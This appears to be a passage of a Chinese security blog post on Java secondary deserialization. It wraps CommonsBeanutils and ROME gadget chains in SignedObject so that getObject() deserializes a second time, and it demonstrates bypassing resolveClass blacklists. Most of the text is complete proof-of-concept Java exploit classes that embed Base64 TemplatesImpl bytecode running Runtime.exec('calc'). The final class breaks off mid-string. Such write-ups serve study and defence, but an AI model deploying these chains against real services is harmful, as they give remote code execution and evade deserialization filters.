<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SignedObject</span><span class="params">(Serializable object, PrivateKey signingKey,</span></span><br><span class="line"><span class="params">                     Signature signingEngine)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;</span><br><span class="line">         <span class="comment">// creating a stream pipe-line, from a to b</span></span><br><span class="line">         <span class="type">ByteArrayOutputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">         <span class="type">ObjectOutput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// write and flush the object content to byte array</span></span><br><span class="line">         a.writeObject(object);</span><br><span class="line">         a.flush();</span><br><span class="line">         a.close();</span><br><span class="line">         <span class="built_in">this</span>.content = b.toByteArray();</span><br><span class="line">         b.close();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// now sign the encapsulated object</span></span><br><span class="line">         <span class="built_in">this</span>.sign(signingKey, signingEngine);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>将我们传入的序列化数据存在在content中</p>
<p>⽽这个类提供的getObject⽅法就是反序列化还原这个对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们只要构造一个我们需要的这个类然后想办法触发这个getObjetc就行了</p>
<h3 id="cb链"><a href="#cb链" class="headerlink" title="cb链"></a>cb链</h3><p>在CB链中⽤到了调⽤某个类getter⽅法的思想，⽽getObject好像也是个getter⽅法</p>
<p>对应org.apache.commons.beanutils.BeanComparator类的compare⽅法</p>
<p>所以直接写链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue1</span> <span class="operator">=</span> getQueue(impl,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(queue1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue2</span> <span class="operator">=</span> getQueue(signedObject, <span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue2);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue <span class="title function_">getQueue</span><span class="params">(Object object, String string)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, string);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这⾥我编写了⼀个Security类，重写了resolveClass⽅法，这个⽅法主要⽤于获取反序列化需要⽤到的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Security</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Security</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		<span class="built_in">super</span>(in);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">		System.out.println(desc.getName());</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常的CB链输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.PriorityQueue</span><br><span class="line">org.apache.commons.beanutils.BeanComparator</span><br><span class="line">java.lang.String$CaseInsensitiveComparator</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">[[B</span><br><span class="line">[B</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.lang.Number</span><br></pre></td></tr></table></figure>

<p>利⽤到了TemplatesImpl类来加载字节码，使⽤会获取TemplatesImpl的Class对象</p>
<p>⼆次反序列化CB链的输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.PriorityQueue</span><br><span class="line">org.apache.commons.beanutils.BeanComparator</span><br><span class="line">java.lang.String$CaseInsensitiveComparator</span><br><span class="line">java.security.SignedObject</span><br><span class="line">[B</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.lang.Number</span><br></pre></td></tr></table></figure>

<p>是⽤到SignedObject类的getObject⽅法触发另⼀个反序列化</p>
<p>由此可⻅，可以绕过⼀些⿊名单的限制</p>
<h2 id="rome"><a href="#rome" class="headerlink" title="rome"></a>rome</h2><p>第⼆反应就是rome链，</p>
<h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p>调⽤链⽤到ToStringBean.toString()⽅法</p>
<p>也是直接写poc，这里用的是hashmap,用之前分析过的链子就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> getHashMap(Templates.class, impl);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(map1, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> getHashMap(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(map2);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getHashMap</span><span class="params">(Class clazz, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;rand&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;rand&quot;</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">expObjectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(clazz, obj);</span><br><span class="line">        setFieldValue(objectBean, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, expObjectBean));</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h3><p>rome 链的关键转折点在于<code>pReadMethod.invoke(_obj,NO_PARAMS)</code>，<code>EqualsBean</code>也存在这个关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">beanEquals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean1</span> <span class="operator">=</span> <span class="built_in">this</span>._obj;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean2</span> <span class="operator">=</span> obj;</span><br><span class="line">    <span class="type">boolean</span> eq;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        eq = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 == <span class="literal">null</span> &amp;&amp; obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        eq = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean1 != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>._beanClass.isInstance(obj)) &#123;</span><br><span class="line">            eq = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            eq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">                <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; eq &amp;&amp; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                        <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                        <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> pReadMethod.invoke(bean1, NO_PARAMS);<span class="comment">//这里也就调用了get</span></span><br><span class="line">                            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> pReadMethod.invoke(bean2, NO_PARAMS);</span><br></pre></td></tr></table></figure>

<p>而它的equals能触发这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.beanEquals(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以想着cc7链的equals</p>
<p>所以写poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                        <span 